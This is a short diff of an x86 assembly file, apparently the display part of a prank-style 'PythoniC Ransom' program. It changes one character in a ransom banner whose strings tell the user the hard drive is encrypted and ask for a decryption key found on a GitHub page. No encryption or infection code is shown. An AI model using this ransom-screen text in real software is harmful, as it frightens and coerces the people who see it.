@@ -69,7 +69,7 @@ endPrinting:                   ; <= Function 'endPrinting'
         ret                    ; <= Return
 
 firstString: db '================================================================================', 0xA, 0xD, 0  ; <= Text for show
-secondString: db '        --/\/\/\/\/\/\-=>     You Have Been Infected By The PythoniC Ransom',  0xA, 0xD, 0          ; <= Text for show
+secondString: db '        --/\/\/\/\/\/\>>>     You Have Been Infected By The PythoniC Ransom',  0xA, 0xD, 0          ; <= Text for show
 thirdString: db '================================================================================', 0xA, 0xD, 0  ; <= Text for show
 descriptionString: db ' Your hard drive had been encrypted LOL...', 0xA, 0xD,' There is no escape with out a decryption key', 0xA, 0xD,' YOU CAN NOT BY THIS KEY!!! You will have to find it!', 0xA, 0xD, ' Trust me, its realy easy to get your key... ', 0xA, 0xD, ' ', 0xA, 0xD, '   1. Go on to your phone, It so easy!', 0xA, 0xD, '   2. On Google look up "https://github.com/CPScript/key"', 0xA, 0xD, '   3. Find the KEY on that page... then type it below!', 0xA, 0xD, ' ', 0xA, 0xD, ' HAVE FUN!!!   :)', 0xA, 0xD, ' ', 0xA, 0xD, 0 ; <= Text for show
 fourghtString: db ' Enter the decryption key: ', 0                                                               ; <= Text for show
